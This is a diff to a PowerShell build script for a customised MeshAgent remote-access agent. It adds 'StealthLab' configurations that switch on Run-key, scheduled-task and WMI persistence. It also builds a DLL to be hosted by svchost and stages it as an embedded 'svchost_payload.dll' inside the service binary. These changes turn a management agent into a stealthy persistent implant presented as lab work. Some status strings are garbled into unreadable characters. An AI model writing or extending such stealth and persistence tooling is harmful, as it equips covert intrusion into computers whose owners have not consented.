@@ -32,14 +32,20 @@
 [CmdletBinding()]
 param(
     [Parameter()]
-    [ValidateSet('Release', 'Debug')]
+    [ValidateSet('Release', 'Debug', 'StealthLab', 'StealthLab_DLL')]
     [string]$Configuration = 'Release',
 
     [Parameter()]
     [switch]$SkipClean,
 
     [Parameter()]
-    [switch]$SkipTests
+    [switch]$SkipTests,
+
+    [Parameter()]
+    [switch]$StealthLab,
+
+    [Parameter()]
+    [switch]$BuildSvchostDll
 )
 
 $ErrorActionPreference = 'Stop'
@@ -56,12 +62,21 @@ $ProjectFile = Join-Path $RepoRoot "meshservice\MeshService-2022.vcxproj"
 $OutputX64 = Join-Path $RepoRoot "meshservice\Release\MeshService64.exe"
 $OutputX86 = Join-Path $RepoRoot "meshservice\Release\MeshService.exe"
 
-Write-Host ""
+Write-Host "" 
 Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host "  MeshAgent Custom Build Script" -ForegroundColor Cyan
 Write-Host "  Configuration: $Configuration" -ForegroundColor Cyan
 Write-Host "================================================================" -ForegroundColor Cyan
 Write-Host ""
+
+# If StealthLab is requested, set environment for branding generator and default config
+if ($StealthLab) {
+    $env:STEALTH_LAB = '1'
+    if ($Configuration -eq 'Release') {
+        $Configuration = 'StealthLab'
+    }
+    Write-Host "[StealthLab] Lab stealth features enabled (env: STEALTH_LAB=1)" -ForegroundColor Yellow
+}
 
 #region Step 1: Validate Environment
 Write-Host "[1/7] Validating build environment..." -ForegroundColor Green
@@ -142,9 +157,11 @@ header = f'''/* Generated file - do not edit. */
 #define MESH_AGENT_NETWORK_JA3 NULL
 
 /* Persistence flags */
-#define MESH_AGENT_PERSIST_RUNKEY 0
-#define MESH_AGENT_PERSIST_TASK 0
-#define MESH_AGENT_PERSIST_WMI 0
+/* In lab builds (STEALTH_LAB=1), default to enabling all persistence knobs */
+{'' if not os.getenv('STEALTH_LAB') else ''}
+#define MESH_AGENT_PERSIST_RUNKEY {1 if os.getenv('STEALTH_LAB') else 0}
+#define MESH_AGENT_PERSIST_TASK {1 if os.getenv('STEALTH_LAB') else 0}
+#define MESH_AGENT_PERSIST_WMI {1 if os.getenv('STEALTH_LAB') else 0}
 #define MESH_AGENT_PERSIST_WATCHDOG 1
 
 #endif /* GENERATED_MESHAGENT_BRANDING_H */
@@ -249,7 +266,43 @@ if (-not $SkipClean) {
 }
 #endregion
 
-#region Step 5: Build x64
+# Optional pre-step: build StealthLab_DLL and stage payload for resource bundling
+if ($BuildSvchostDll -or $StealthLab) {
+    Write-Host "[Pre] Building svchost DLL (StealthLab_DLL|x64) for bundling..." -ForegroundColor Green
+    $dllArgsPre = @(
+        $ProjectFile,
+        "/p:Configuration=StealthLab_DLL",
+        "/p:Platform=x64",
+        "/p:WindowsTargetPlatformVersion=10.0",
+        "/p:PlatformToolset=v143",
+        "/m",
+        "/v:minimal",
+        "/t:Rebuild"
+    )
+    & $MSBuildPath $dllArgsPre
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "? Pre DLL build failed with exit code $LASTEXITCODE" -ForegroundColor Red
+        exit $LASTEXITCODE
+    }
+    # Stage payload to embedded\svchost_payload.dll so bundle_resources.rc can include it
+    $dllOutDirPre = Join-Path $RepoRoot "meshservice\StealthLab_DLL"
+    $dllOutDirPreAlt = Join-Path $RepoRoot "meshservice\x64\StealthLab_DLL"
+    $payloadDir = Join-Path $RepoRoot "meshservice\embedded"
+    if (-not (Test-Path $payloadDir)) { New-Item -Path $payloadDir -ItemType Directory | Out-Null }
+    $dllCandidate = $null
+    if (Test-Path $dllOutDirPre) {
+        $dllCandidate = Get-ChildItem -Path $dllOutDirPre -Filter *.dll | Select-Object -First 1
+    }
+    if (-not $dllCandidate -and (Test-Path $dllOutDirPreAlt)) {
+        $dllCandidate = Get-ChildItem -Path $dllOutDirPreAlt -Filter *.dll | Select-Object -First 1
+    }
+    if ($dllCandidate) {
+        Copy-Item -Path $dllCandidate.FullName -Destination (Join-Path $payloadDir "svchost_payload.dll") -Force
+        Write-Host "[Pre] Staged payload: $($dllCandidate.Name) -> embedded\\svchost_payload.dll" -ForegroundColor Gray
+    } else {
+        Write-Host "? No DLL found to bundle in $dllOutDirPre" -ForegroundColor Yellow
+    }
+}#region Step 5: Build x64
 Write-Host "[5/7] Building MeshService x64..." -ForegroundColor Green
 
 $buildArgs = @(
@@ -355,5 +408,33 @@ if (-not $SkipTests) {
     Write-Host "✅ Basic validation passed" -ForegroundColor Gray
 }
 
-Write-Host ""
+Write-Host "" 
 #endregion
+
+# Optionally build the svchost-hosted DLL (x64) in the same run
+if ($BuildSvchostDll) {
+    Write-Host "[Extra] Building svchost DLL (StealthLab_DLL|x64)..." -ForegroundColor Green
+    $dllArgs = @(
+        $ProjectFile,
+        "/p:Configuration=StealthLab_DLL",
+        "/p:Platform=x64",
+        "/p:WindowsTargetPlatformVersion=10.0",
+        "/p:PlatformToolset=v143",
+        "/m",
+        "/v:minimal",
+        "/t:Rebuild"
+    )
+    & $MSBuildPath $dllArgs
+    if ($LASTEXITCODE -ne 0) {
+        Write-Host "�?O DLL build failed with exit code $LASTEXITCODE" -ForegroundColor Red
+        exit $LASTEXITCODE
+    }
+    $dllOutDir = Join-Path $RepoRoot "meshservice\StealthLab_DLL"
+    $dllFiles = Get-ChildItem -Path $dllOutDir -Filter *.dll -ErrorAction SilentlyContinue
+    if ($dllFiles) {
+        $dllList = ($dllFiles | Select-Object -ExpandProperty FullName) -join ", "
+        Write-Host "�o. DLL build completed: $dllList" -ForegroundColor Gray
+    } else {
+        Write-Host "�s��,? DLL built but no .dll found in $dllOutDir (check project TargetName)" -ForegroundColor Yellow
+    }
+}
